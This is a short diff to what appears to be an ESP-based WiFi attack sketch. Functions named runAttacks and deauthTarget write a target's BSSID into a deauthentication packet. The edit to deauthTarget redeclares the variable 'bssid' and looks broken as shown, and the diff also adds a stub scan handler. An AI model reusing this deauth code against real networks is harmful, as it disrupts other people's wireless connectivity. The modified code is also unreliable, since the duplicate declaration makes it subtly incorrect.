@@ -136,7 +136,7 @@ void runAttacks() {
 
 void deauthTarget() {
   uint8_t bssid[6];
-  WiFi.BSSID(bssid);
+  uint8_t* bssid = WiFi.BSSID();
   
   memcpy(&deauthPacket[10], bssid, 6);
   memcpy(&deauthPacket[16], bssid, 6);
@@ -253,4 +253,7 @@ String urlEncode(String str) {
   encoded.replace("\n", "%0A");
   encoded.replace("&", "%26");
   return encoded;
+}
+void handleScan() {
+  webServer.send(200, "text/plain", "Scan OK");
 }
